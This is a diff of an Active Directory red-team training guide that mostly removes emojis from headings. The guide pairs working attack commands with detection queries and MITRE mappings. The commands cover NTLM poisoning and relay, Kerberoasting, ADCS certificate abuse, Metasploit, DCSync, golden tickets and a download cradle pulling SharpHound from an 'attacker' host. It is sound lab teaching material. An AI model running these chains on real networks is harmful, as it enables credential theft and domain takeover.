@@ -1,22 +1,22 @@
-# 🧭 HOW TO USE THIS DOCUMENT (IMPORTANT)
+# HOW TO USE THIS DOCUMENT (IMPORTANT)
 
 This file is **NOT a cheat sheet**.
 Each phase contains:
 
-- 🎯 **Red-Team Goal**
-- 🧪 **Student Lab (hands-on)**
-- 🧠 **Tool Descriptions** (what / how / when / why)
-- ✅ **Success Criteria**
-- 🛡️ **Blue-Team View**
-- 🧬 **MITRE ATT&CK Mapping**
-- 👀 **Detection Ideas**
-- ⚔️ **Modern Attack Examples & Commands**
+- **Red-Team Goal**
+- **Student Lab (hands-on)**
+- **Tool Descriptions** (what / how / when / why)
+- **Success Criteria**
+- **Blue-Team View**
+- **MITRE ATT&CK Mapping**
+- **Detection Ideas**
+- **Modern Attack Examples & Commands**
 
 **Instructor Rule**
 
 > Students **cannot advance** without explaining what a defender would see.
 
-# 🧬 MITRE ATT&CK → LOG SOURCE → DETECTION MATRIX (ACTIVE DIRECTORY)
+# MITRE ATT&CK → LOG SOURCE → DETECTION MATRIX (ACTIVE DIRECTORY)
 
 ## Purpose
 
@@ -63,13 +63,13 @@ If these are not enabled, **detections will fail regardless of tooling**.
 
 ---
 
-# 🔴 PHASE 1 – RECONNAISSANCE
+# PHASE 1 – RECONNAISSANCE
 
-## 🎯 Red-Team Goal
+## Red-Team Goal
 
 Identify hosts, services, and Active Directory presence **without exploitation**.
 
-## 🧠 Tool Description – Nmap
+## Tool Description – Nmap
 
 **Nmap** is a network discovery and service enumeration tool used to identify live hosts, open ports, running services, and OS fingerprints. It is used **before authentication** to understand the attack surface. In enterprise environments, Nmap is often the **first detectable attacker action**.
 
@@ -79,7 +79,7 @@ Identify hosts, services, and Active Directory presence **without exploitation**
 - When mapping unknown networks
 - To confirm AD infrastructure via ports
 
-## 🧠 Tool Description – Masscan (Added Extension)
+## Tool Description – Masscan (Added Extension)
 
 **Masscan** is a high-speed network scanner similar to Nmap but optimized for scanning large IP ranges quickly. It uses asynchronous transmission to achieve speeds up to 10 million packets per second. Use it **when speed is critical** in large-scale reconnaissance, such as scanning entire subnets or the internet, but follow up with Nmap for detailed service enumeration.
 
@@ -96,7 +96,7 @@ masscan -p1-65535 172.28.128.0/24 --rate=1000
 
 **Why Use It:** Reduces time in reconnaissance phase while minimizing detection if rate-limited properly.
 
-## ⚔️ Modern Attack Example: Stealth Recon with ZMap + Nmap Hybrid
+## Modern Attack Example: Stealth Recon with ZMap + Nmap Hybrid
 
 **Scenario:** Quickly find all domain controllers in a /16 network while minimizing dwell time.
 
@@ -111,7 +111,7 @@ nmap -sV -sC -p 88,389,445,636 -iL ldap_hosts.txt -oA dc_enum
 nmap --script ldap-rootdse,smb-os-discovery -p 389,445 -iL dc_candidates.txt
 ```
 
-## 🧪 LAB – Network Recon
+## LAB – Network Recon
 
 ```bash
 nmap -sn 172.28.128.0/24
@@ -119,23 +119,23 @@ nmap -sC -sV -p- <TARGET>
 nmap -p 53,88,389,445,636 <DC_IP>
 ```
 
-## ✅ Success Criteria
+## Success Criteria
 
 - Student identifies the Domain Controller
 - Student explains why the discovered ports indicate AD
 
-## 🛡️ Blue-Team View
+## Blue-Team View
 
 - Firewall logs (5156, 5158) showing port scans
 - IDS alerts for host/port scanning patterns
 - Windows Security logs showing connection attempts
 
-## 🧬 MITRE ATT&CK Mapping
+## MITRE ATT&CK Mapping
 
 - **T1046** – Network Service Discovery
 - **T1018** – Remote System Discovery
 
-## 👀 Detection Ideas
+## Detection Ideas
 
 ```kql
 // Splunk SPL - Detect Horizontal Scans
@@ -166,25 +166,25 @@ detection:
 
 ---
 
-# 🔴 PHASE 2 – SMB ENUMERATION & NTLM POISONING
+# PHASE 2 – SMB ENUMERATION & NTLM POISONING
 
-## 🎯 Red-Team Goal
+## Red-Team Goal
 
 Extract identities and shared resources **without valid credentials**.
 
-## 🧠 Tool Description – enum4linux-ng
+## Tool Description – enum4linux-ng
 
 `enum4linux-ng` automates **SMB, RPC, and NetBIOS enumeration**. It queries Windows systems for users, groups, shares, and policies using anonymous or low-privileged access. It is used **early** to identify misconfigurations.
 
-## 🧠 Tool Description – CrackMapExec (CME)
+## Tool Description – CrackMapExec (CME)
 
 CrackMapExec is an **Active Directory post-exploitation framework** used for credential validation, enumeration, and lateral actions at scale. It simulates how attackers **operate across real enterprise networks**.
 
-## 🧠 Tool Description – smbclient
+## Tool Description – smbclient
 
 `smbclient` is a **legitimate SMB client** for interacting with Windows shares. Because it uses normal SMB behavior, it often **bypasses simplistic detection**. Attackers use it to browse SYSVOL, scripts, and configuration files.
 
-## 🧠 Tool Description – Responder (Added Extension)
+## Tool Description – Responder (Added Extension)
 
 **Responder** is a LLMNR, NBT-NS, and mDNS poisoner that captures and relays NTLM hashes from network broadcasts. Use it **passively** in reconnaissance to harvest credentials from misconfigured networks without direct interaction. It's ideal for internal networks where multicast protocols are enabled.
 
@@ -201,7 +201,7 @@ responder -I eth0 -rdwv
 
 **Why Use It:** Provides opportunistic credential access early in the chain, blending into network noise.
 
-## ⚔️ Modern Attack Example: Coercion + Relay with PetitPotam + ntlmrelayx
+## Modern Attack Example: Coercion + Relay with PetitPotam + ntlmrelayx
 
 **Scenario:** Force a Domain Controller to authenticate to attacker-controlled machine and relay to ADCS for certificate theft.
 
@@ -225,7 +225,7 @@ certipy req -u 'DOMAIN\\Administrator' -p '' -pfx administrator.pfx \
   -template DomainController
 ```
 
-## 🧪 LAB – SMB Enumeration
+## LAB – SMB Enumeration
 
 ```bash
 # Modern NetExec (nxc) approach
@@ -241,24 +241,24 @@ enum4linux-ng -A <TARGET> -oY enum_output.yaml
 responder -I eth0 -dwFP --lm
 ```
 
-## ✅ Success Criteria
+## Success Criteria
 
 - Enumerates ≥3 shares including SYSVOL
 - Captures at least one NTLM hash via poisoning
 - Explains LLMNR/NBT-NS poisoning mechanism
 
-## 🛡️ Blue-Team View
+## Blue-Team View
 
 - Security Event 4624 (Logon Type 3) with ANONYMOUS LOGON
 - DNS logs showing LLMNR queries
 - SMB server logs showing anonymous access attempts
 
-## 🧬 MITRE ATT&CK Mapping
+## MITRE ATT&CK Mapping
 
 - **T1135** – Network Share Discovery
 - **T1557.001** – Adversary-in-the-Middle (LLMNR/NBT-NS)
 
-## 👀 Detection Ideas
+## Detection Ideas
 
 ```kql
 // Splunk SPL - Detect LLMNR/NBT-NS Poisoning
@@ -289,21 +289,21 @@ detection:
 
 ---
 
-# 🔴 PHASE 3 – LDAP ENUMERATION
+# PHASE 3 – LDAP ENUMERATION
 
-## 🎯 Red-Team Goal
+## Red-Team Goal
 
 Query Active Directory for structured identity and privilege data.
 
-## 🧠 Tool Description – ldapsearch
+## Tool Description – ldapsearch
 
 `ldapsearch` is a **raw LDAP query tool** that directly queries directory objects. It is **powerful but noisy**, producing verbose directory logs. It is used when precision or custom filters are required.
 
-## 🧠 Tool Description – windapsearch
+## Tool Description – windapsearch
 
 `windapsearch` is an AD-focused LDAP enumeration tool that simplifies common queries (users, groups, SPNs). It is preferred for **speed and clarity** during engagements.
 
-## 🧠 Tool Description – ADExplorer (Added Extension)
+## Tool Description – ADExplorer (Added Extension)
 
 **ADExplorer** is a graphical tool from Sysinternals for browsing and searching Active Directory objects. Use it **interactively** to explore AD structure, attributes, and permissions without writing queries. It's great for visual learners or when scripting isn't feasible.
 
@@ -316,7 +316,7 @@ Query Active Directory for structured identity and privilege data.
 
 **Why Use It:** Provides a user-friendly alternative to command-line tools for deeper understanding.
 
-## ⚔️ Modern Attack Example: Stealthy LDAP Enumeration with ADSearch
+## Modern Attack Example: Stealthy LDAP Enumeration with ADSearch
 
 **Scenario:** Enumerate high-value targets without triggering volume-based alerts.
 
@@ -335,7 +335,7 @@ Query Active Directory for structured identity and privilege data.
   --pagesize 50  # Smaller pages to blend in
 ```
 
-## 🧪 LAB – LDAP Enumeration
+## LAB – LDAP Enumeration
 
 ### Example Commands – ldapsearch
 
@@ -366,24 +366,24 @@ windapsearch --dc <DC_IP> -u "user@domain.local" -p 'password' \
   --module groups --full --output groups.txt
 ```
 
-## ✅ Success Criteria
+## Success Criteria
 
 - Enumerates ≥ 5 users and ≥ 2 groups
 - Identifies at least one service account with SPN
 - Explains LDAP filters and SPN value
 
-## 🛡️ Blue-Team View
+## Blue-Team View
 
 - Event ID **1644** – LDAP searches
 - Event ID **1138** – LDAP binds
 - Directory Service access logs
 
-## 🧬 MITRE ATT&CK Mapping
+## MITRE ATT&CK Mapping
 
 - **T1087** – Account Discovery
 - **T1069** – Permission Groups Discovery
 
-## 👀 Detection Ideas
+## Detection Ideas
 
 ```kql
 // Splunk SPL - Detect LDAP Enumeration
@@ -412,17 +412,17 @@ detection:
 
 ---
 
-# 🔴 PHASE 4 – BLOODHOUND / AD MAPPING
+# PHASE 4 – BLOODHOUND / AD MAPPING
 
-## 🎯 Red-Team Goal
+## Red-Team Goal
 
 Identify attack paths to high privilege **without guessing**.
 
-## 🧠 Tool Description – BloodHound / SharpHound
+## Tool Description – BloodHound / SharpHound
 
 BloodHound uses graph theory to map **Active Directory trust relationships**. SharpHound collects data via LDAP, SMB, and RPC to answer: _Who can become Domain Admin, and how?_
 
-## 🧠 Tool Description – PowerView (Added Extension)
+## Tool Description – PowerView (Added Extension)
 
 **PowerView** is a PowerShell script for Active Directory enumeration and attack path discovery. Use it **in-memory** to query AD without installing tools, focusing on users, groups, and ACLs. It's a lightweight alternative or complement to BloodHound for quick checks.
 
@@ -441,7 +441,7 @@ Find-DomainShare -CheckShareAccess
 
 **Why Use It:** Runs natively on Windows, evading some EDR if loaded reflectively.
 
-## ⚔️ Modern Attack Example: Stealthy BloodHound Collection
+## Modern Attack Example: Stealthy BloodHound Collection
 
 **Scenario:** Collect AD data without triggering PowerShell/SMB alerts.
 
@@ -463,7 +463,7 @@ $WebClient.DownloadData('http://attacker/SharpHound.ps1') | %{$MemoryStream.Writ
 Invoke-BloodHound -CollectionMethod Session,LoggedOn -Stealth
 ```
 
-## 🧪 LAB – BloodHound Data Collection and Analysis
+## LAB – BloodHound Data Collection and Analysis
 
 ```bash
 # Modern SharpHound with compression and throttling
@@ -483,24 +483,24 @@ WHERE c.owned = true
 RETURN p
 ```
 
-## ✅ Success Criteria
+## Success Criteria
 
 - Successful data collection without detection
 - Identifies ≥ 1 DA path from low-privileged user
 - Explains ACL-based vs group-based escalation
 
-## 🛡️ Blue-Team View
+## Blue-Team View
 
 - PowerShell Event ID **4104** (script block logging)
 - Security Event **4688** (process creation)
 - Unusual LDAP/SMB volume patterns
 
-## 🧬 MITRE ATT&CK Mapping
+## MITRE ATT&CK Mapping
 
 - **T1069** – Permission Groups Discovery
 - **T1482** – Domain Trust Discovery
 
-## 👀 Detection Ideas
+## Detection Ideas
 
 ```kql
 // Splunk SPL - Detect BloodHound Collection
@@ -529,13 +529,13 @@ detection:
 
 ---
 
-# 🔴 PHASE 5 – KERBEROS ABUSE
+# PHASE 5 – KERBEROS ABUSE
 
-## 🎯 Red-Team Goal
+## Red-Team Goal
 
 Extract crackable credentials **without touching endpoints**.
 
-## 🧠 Tool Description – Rubeus (Extended)
+## Tool Description – Rubeus (Extended)
 
 **Rubeus** is a C# tool for Kerberos manipulation, including roasting, ticket forging, and pass-the-ticket attacks. Modern versions support AES encryption, constrained delegation abuse, and cross-domain attacks.
 
@@ -559,7 +559,7 @@ Rubeus.exe silver /user:administrator /domain:domain.local /sid:S-1-5-21-...
   /aes256:<AES_KEY> /target:dc.domain.local /service:cifs
 ```
 
-## ⚔️ Modern Attack Example: Kerberoasting with RC4 Downgrade + AS-REP Roasting
+## Modern Attack Example: Kerberoasting with RC4 Downgrade + AS-REP Roasting
 
 **Scenario:** Extract both service account and user account hashes in one attack chain.
 
@@ -581,7 +581,7 @@ hashcat -m 13100 kerberoast.txt -a 0 /usr/share/wordlists/rockyou.txt -r rules/I
 hashcat -m 18200 asreproast.txt -a 3 ?u?l?l?l?l?l?d?d -i
 ```
 
-## 🧪 LAB – Kerberos Attacks
+## LAB – Kerberos Attacks
 
 ### AS-REP Roasting (No Credentials Needed if Vulnerable Accounts Exist)
 
@@ -614,25 +614,25 @@ windapsearch --dc <DC_IP> -u user@domain.local -p 'password'
   --attrs samaccountname,serviceprincipalname,pwdlastset
 ```
 
-## ✅ Success Criteria
+## Success Criteria
 
 - Extracts both AS-REP and TGS hashes
 - Cracks at least one hash to plaintext
 - Explains RC4 vs AES encryption implications
 
-## 🛡️ Blue-Team View
+## Blue-Team View
 
 - Event ID **4768** (TGT requests)
 - Event ID **4769** (TGS requests)
 - Event ID **4624** (Kerberos logons)
 
-## 🧬 MITRE ATT&CK Mapping
+## MITRE ATT&CK Mapping
 
 - **T1558.001** – AS-REP Roasting
 - **T1558.003** – Kerberoasting
 - **T1550.003** – Pass the Ticket
 
-## 👀 Detection Ideas
+## Detection Ideas
 
 ```kql
 // Splunk SPL - Detect Kerberoasting
@@ -657,13 +657,13 @@ detection:
 
 ---
 
-# 🔴 PHASE 5.5 – OFFLINE CREDENTIAL CRACKING
+# PHASE 5.5 – OFFLINE CREDENTIAL CRACKING
 
-## 🎯 Red-Team Goal
+## Red-Team Goal
 
 Crack harvested hashes from Kerberoast/AS-REP offline to recover plaintext passwords.
 
-## ⚔️ Modern Attack Example: Advanced Hash Cracking with Rules and Masks
+## Modern Attack Example: Advanced Hash Cracking with Rules and Masks
 
 **Scenario:** Crack complex corporate passwords using modern techniques.
 
@@ -694,7 +694,7 @@ hashcat --brain-server --brain-password MySecret
 hashcat -m 13100 kerberoast.txt -a 0 wordlist.txt --brain-client
 ```
 
-## 🧪 LAB – Offline Cracking
+## LAB – Offline Cracking
 
 ```bash
 # Prepare custom wordlist from target organization
@@ -714,7 +714,7 @@ john --format=krb5tgs kerberoast.txt --wordlist=combined.txt --rules=KoreLogic
 hashcat -m 13100 -w 4 -O -u 256 --kernel-accel=1600 kerberoast.txt combined.txt
 ```
 
-## ✅ Success Criteria
+## Success Criteria
 
 - Recovers ≥2 passwords from hashes
 - Demonstrates multiple cracking strategies
@@ -722,13 +722,13 @@ hashcat -m 13100 -w 4 -O -u 256 --kernel-accel=1600 kerberoast.txt combined.txt
 
 ---
 
-# 🔴 PHASE 5.6 – NTLM RELAY & COERCION ATTACKS
+# PHASE 5.6 – NTLM RELAY & COERCION ATTACKS
 
-## 🎯 Red-Team Goal
+## Red-Team Goal
 
 Force/coerce NTLM authentication from machines and relay to high-value targets.
 
-## ⚔️ Modern Attack Example: ADCS Relay + Resource-Based Constrained Delegation
+## Modern Attack Example: ADCS Relay + Resource-Based Constrained Delegation
 
 **Scenario:** Full chain from coercion to Domain Admin.
 
@@ -759,7 +759,7 @@ Rubeus.exe s4u /user:COMPROMISED$ /rc4:<NTLM_HASH>
   /altservice:http,host,rpcss,wsman,ldap
 ```
 
-## 🧪 LAB – NTLM Relay with Modern Coercion
+## LAB – NTLM Relay with Modern Coercion
 
 ```bash
 # Multi-relay setup with multiple targets
@@ -785,24 +785,24 @@ impacket-ntlmrelayx --no-smb-server --no-http-server \
   --no-da
 ```
 
-## ✅ Success Criteria
+## Success Criteria
 
 - Successfully relays authentication to ADCS
 - Obtains certificate for privileged account
 - Explains EPA/channel binding bypasses
 
-## 🛡️ Blue-Team View
+## Blue-Team View
 
 - Event ID 4624 (Type 3 from DC to unusual hosts)
 - ADCS Event IDs 4886–4889 (certificate requests)
 - Windows Defender for Identity alerts
 
-## 🧬 MITRE ATT&CK Mapping
+## MITRE ATT&CK Mapping
 
 - **T1557.001** – Adversary-in-the-Middle
 - **T1606** – Forge Web Credentials
 
-## 👀 Detection Ideas
+## Detection Ideas
 
 ```kql
 // Splunk SPL - Detect NTLM Relay
@@ -832,13 +832,13 @@ detection:
 
 ---
 
-# 🔴 PHASE 6 – ADCS (CERTIFICATE ABUSE)
+# PHASE 6 – ADCS (CERTIFICATE ABUSE)
 
-## 🎯 Red-Team Goal
+## Red-Team Goal
 
 Exploit misconfigured Active Directory Certificate Services (AD CS) to impersonate privileged users, obtain authentication certificates, and achieve privilege escalation or persistence — often leading to Domain Admin access without traditional credential theft.
 
-## 🧠 Tool Description – Certipy
+## Tool Description – Certipy
 
 **Certipy** (by ly4k) is the leading modern Python tool (2025–2026 standard) for enumerating, abusing, and attacking AD CS environments. It identifies vulnerable templates (ESC1–ESC16), requests rogue certificates, performs NTLM relay to AD CS (ESC8), handles shadow credentials, and supports PKINIT authentication. Preferred over older tools like Certify due to active maintenance, stealth options, and full ESC coverage.
 
@@ -849,7 +849,7 @@ Exploit misconfigured Active Directory Certificate Services (AD CS) to impersona
 - Post-exploitation (authenticate with stolen certs, shadow creds)
 - In labs with AD CS servers (like your CA01)
 
-## ⚔️ Modern Attack Example: ESC1 + ESC8 Chain (Certificate Impersonation & Relay)
+## Modern Attack Example: ESC1 + ESC8 Chain (Certificate Impersonation & Relay)
 
 **Scenario:** Low-priv user requests a certificate impersonating Domain Admin (ESC1), or relays NTLM to steal a DC cert (ESC8) for full domain takeover.
 
@@ -879,7 +879,7 @@ coercer.py coerce -u 'svc_delegate@lab.local' -p 'ServiceP@ss3' \
 # After relay success → use stolen DC cert for persistence or further attacks
 ```
 
-## 🧪 LAB – ADCS Abuse
+## LAB – ADCS Abuse
 
 _(Assumes your new CA01 VM at 172.28.128.24 is domain-joined and has vulnerable templates like VulnESC1)_
 
@@ -905,14 +905,14 @@ ntlmrelayx.py -t http://ca01.lab.local/certsrv/certfnsh.asp --adcs --template Do
 # Then coerce from another session (e.g., using your svc_delegate account)
 ```
 
-## ✅ Success Criteria
+## Success Criteria
 
 - Identifies ≥2 vulnerable templates (e.g., VulnESC1, VulnESC2)
 - Successfully requests and uses a certificate for Domain Admin impersonation
 - Authenticates via PKINIT and retrieves NT hash or TGT
 - Explains difference between ESC1 (template abuse) and ESC8 (relay)
 
-## 🛡️ Blue-Team View
+## Blue-Team View
 
 - AD CS Operational logs on CA01 (Event Viewer → Applications and Services Logs → Microsoft → Windows → CertificateServices)
 - Security Event IDs on CA01:
@@ -926,13 +926,13 @@ ntlmrelayx.py -t http://ca01.lab.local/certsrv/certfnsh.asp --adcs --template Do
 - After cert usage: Event ID 4768 on DC (TGT request with PreAuthType=16 for PKINIT)
 - Unusual requester vs. subject mismatch (SAN/UPN spoofing)
 
-## 🧬 MITRE ATT&CK Mapping
+## MITRE ATT&CK Mapping
 
 - **T1649** – Steal or Forge Authentication Certificates (primary)
 - **T1550.003** – Use Alternate Authentication Material: Pass the Certificate
 - **T1606** – Forge Web Credentials (related to relay scenarios)
 
-## 👀 Detection Ideas
+## Detection Ideas
 
 ```kql
 // Splunk/KQL - Detect Suspicious Certificate Requests (ESC1/ESC8 indicators)
@@ -976,13 +976,13 @@ level: high
 
 ---
 
-# 🔴 PHASE 7 – METASPLOIT FRAMEWORK (MODERN)
+# PHASE 7 – METASPLOIT FRAMEWORK (MODERN)
 
-## 🎯 Red-Team Goal
+## Red-Team Goal
 
 Achieve controlled exploitation and post-exploitation with modern evasion.
 
-## ⚔️ Modern Attack Example: Staged Attack with Custom Malleable C2
+## Modern Attack Example: Staged Attack with Custom Malleable C2
 
 **Scenario:** Deploy Meterpreter with full evasion chain.
 
@@ -1029,7 +1029,7 @@ msf6 > set SESSION 1
 msf6 > run
 ```
 
-## 🧪 LAB – Modern Metasploit Usage
+## LAB – Modern Metasploit Usage
 
 ```bash
 # Setup HTTPS listener with legitimate certificate
@@ -1058,26 +1058,26 @@ msf6 > set PSH-EncodedCommand true
 msf6 > exploit
 ```
 
-## ✅ Success Criteria
+## Success Criteria
 
 - Establishes Meterpreter session with HTTPS
 - Performs credential dumping via Kiwi
 - Sets up SOCKS proxy for pivoting
 
-## 🛡️ Blue-Team View
+## Blue-Team View
 
 - AMSI events (Event ID 1)
 - PowerShell script block logging (4104)
 - Sysmon Event ID 1 (process creation)
 - Network traffic to non-standard ports
 
-## 🧬 MITRE ATT&CK Mapping
+## MITRE ATT&CK Mapping
 
 - **T1059** – Command and Scripting Interpreter
 - **T1003** – OS Credential Dumping
 - **T1210** – Exploitation of Remote Services
 
-## 👀 Detection Ideas
+## Detection Ideas
 
 ```kql
 // Splunk SPL - Detect Meterpreter Traffic
@@ -1106,13 +1106,13 @@ detection:
 
 ---
 
-# 🔴 PHASE 8 – PRIVILEGE ESCALATION
+# PHASE 8 – PRIVILEGE ESCALATION
 
-## 🎯 Red-Team Goal
+## Red-Team Goal
 
 Elevate from low-privileged user to SYSTEM/Administrator.
 
-## ⚔️ Modern Attack Example: Full Windows PrivEsc Chain
+## Modern Attack Example: Full Windows PrivEsc Chain
 
 **Scenario:** From service account to Domain Admin via multiple vectors.
 
@@ -1139,7 +1139,7 @@ python3 windows-exploit-suggester.py --database 2024-01.db --systeminfo systemin
 .\Watson.exe /output vulnerabilities.txt
 ```
 
-## 🧪 LAB – Modern Privilege Escalation
+## LAB – Modern Privilege Escalation
 
 ```bash
 # LinPEAS for Linux (modern version)
@@ -1164,24 +1164,24 @@ Invoke-AllChecks
 .\Sherlock.ps1 -Command Find-AllVulns
 ```
 
-## ✅ Success Criteria
+## Success Criteria
 
 - Identifies ≥3 privilege escalation vectors
 - Successfully escalates to SYSTEM/root
 - Explains the vulnerability exploited
 
-## 🛡️ Blue-Team View
+## Blue-Team View
 
 - Security Event **4688** (process creation)
 - Sysmon Event **10** (process access)
 - Windows Event **4697** (service installation)
 
-## 🧬 MITRE ATT&CK Mapping
+## MITRE ATT&CK Mapping
 
 - **T1068** – Exploitation for Privilege Escalation
 - **T1548** – Abuse Elevation Control Mechanism
 
-## 👀 Detection Ideas
+## Detection Ideas
 
 ```kql
 // Splunk SPL - Detect Privilege Escalation
@@ -1206,13 +1206,13 @@ detection:
 
 ---
 
-# 🔴 PHASE 9 – LATERAL MOVEMENT
+# PHASE 9 – LATERAL MOVEMENT
 
-## 🎯 Red-Team Goal
+## Red-Team Goal
 
 Move laterally through the network using compromised credentials.
 
-## ⚔️ Modern Attack Example: Pass-the-Hash/Ticket at Scale
+## Modern Attack Example: Pass-the-Hash/Ticket at Scale
 
 **Scenario:** Move from initial foothold to Domain Controller.
 
@@ -1246,7 +1246,7 @@ schtasks /create /s 192.168.1.10 /u Administrator /p '' /tn "Update"
 schtasks /run /s 192.168.1.10 /tn "Update"
 ```
 
-## 🧪 LAB – Modern Lateral Movement
+## LAB – Modern Lateral Movement
 
 ```bash
 # Using Impacket's full suite
@@ -1269,24 +1269,24 @@ sliver > pivots tcp -b 0.0.0.0:8443
 sliver > portfwd add -r 192.168.1.10:445 -b 127.0.0.1:4445
 ```
 
-## ✅ Success Criteria
+## Success Criteria
 
 - Moves laterally to ≥3 different systems
 - Uses ≥2 different protocols (SMB, WMI, WinRM)
 - Maintains access through multiple methods
 
-## 🛡️ Blue-Team View
+## Blue-Team View
 
 - Security Event **4624** (logon type 3)
 - Security Event **4688** (remote process creation)
 - Windows Event **4698** (scheduled task creation)
 
-## 🧬 MITRE ATT&CK Mapping
+## MITRE ATT&CK Mapping
 
 - **T1021** – Remote Services
 - **T1550** – Use Alternate Authentication Material
 
-## 👀 Detection Ideas
+## Detection Ideas
 
 ```kql
 // Splunk SPL - Detect Lateral Movement
@@ -1315,13 +1315,13 @@ detection:
 
 ---
 
-# 🔴 PHASE 10 – DOMAIN DOMINANCE
+# PHASE 10 – DOMAIN DOMINANCE
 
-## 🎯 Red-Team Goal
+## Red-Team Goal
 
 Achieve complete control over the Active Directory domain.
 
-## ⚔️ Modern Attack Example: Golden Ticket + DCShadow + Persistence
+## Modern Attack Example: Golden Ticket + DCShadow + Persistence
 
 **Scenario:** Establish persistent domain control.
 
@@ -1357,7 +1357,7 @@ certipy shadow auto -u 'DOMAIN\\Administrator' -p '' -pfx administrator.pfx
   -account DC01$ -target dc01.domain.local
 ```
 
-## 🧪 LAB – Domain Dominance
+## LAB – Domain Dominance
 
 ```bash
 # DCSync alternatives
@@ -1390,25 +1390,25 @@ mimikatz # misc::skeleton
 # Test with password "mimikatz"
 ```
 
-## ✅ Success Criteria
+## Success Criteria
 
 - Successfully performs DCSync
 - Creates and uses golden ticket
 - Establishes ≥2 persistence mechanisms
 
-## 🛡️ Blue-Team View
+## Blue-Team View
 
 - Event ID **4662** (directory service access)
 - Event ID **4670** (permissions changes)
 - Windows Defender for Identity alerts
 
-## 🧬 MITRE ATT&CK Mapping
+## MITRE ATT&CK Mapping
 
 - **T1003.006** – DCSync
 - **T1558.001** – Golden Ticket
 - **T1547** – Boot or Logon Autostart Execution
 
-## 👀 Detection Ideas
+## Detection Ideas
 
 ```kql
 // Splunk SPL - Detect DCSync Attacks
@@ -1435,7 +1435,7 @@ detection:
 
 ---
 
-# 🟣 PURPLE TEAM EXERCISES
+# PURPLE TEAM EXERCISES
 
 ## Exercise 1: Full Attack Chain Simulation
 
@@ -1498,7 +1498,7 @@ detection:
 
 ---
 
-# 🧪 FAILURE LABS (LEARNING FROM MISTAKES)
+# FAILURE LABS (LEARNING FROM MISTAKES)
 
 ## Lab 1: OpSec Failures
 
@@ -1554,7 +1554,7 @@ Tier 4 (Low): Port scans, failed logins
 
 ---
 
-# 📊 SOC INVESTIGATION TABLES
+# SOC INVESTIGATION TABLES
 
 ## Table 1: Event ID Quick Reference
 
@@ -1596,7 +1596,7 @@ Tier 4 (Low): Port scans, failed logins
 
 ---
 
-# 🎯 CAPSTONE PROJECT: ENTERPRISE ATTACK SIMULATION
+# CAPSTONE PROJECT: ENTERPRISE ATTACK SIMULATION
 
 ## Scenario: Financial Institution Breach
 
@@ -1657,7 +1657,7 @@ dnscat2 --secret MySecret --dns domain=bank.internal
 
 ---
 
-# 📈 METRICS AND MEASUREMENT
+# METRICS AND MEASUREMENT
 
 ## Key Performance Indicators (KPIs)
 
@@ -1681,7 +1681,7 @@ dnscat2 --secret MySecret --dns domain=bank.internal
 
 ---
 
-# 🔧 TOOL MAINTENANCE AND UPDATES
+# TOOL MAINTENANCE AND UPDATES
 
 ## Weekly Tool Updates
 
@@ -1721,7 +1721,7 @@ class StealthCollector(BloodHound):
 
 ---
 
-# 🎓 INSTRUCTOR NOTES
+# INSTRUCTOR NOTES
 
 ## Teaching Methodology
 
@@ -1754,18 +1754,3 @@ class StealthCollector(BloodHound):
 4. **Note checks:** Random notebook inspections
 
 ---
-
-# 🏁 CONCLUSION
-
-## Final Principles
-
-1. **There is no silver bullet:** Defense requires layered security
-2. **Assume breach:** Focus on detection and response
-3. **Continuous improvement:** Security is a process, not a destination
-4. **Balance:** Security vs usability trade-offs
-
-## Remember:
-
-> "The only secure system is one that is powered off, cast in a block of concrete, and sealed in a lead-lined room with armed guards." - Gene Spafford
->
-> "But even then, I wouldn't stake my life on it." - Modern SOC Analyst
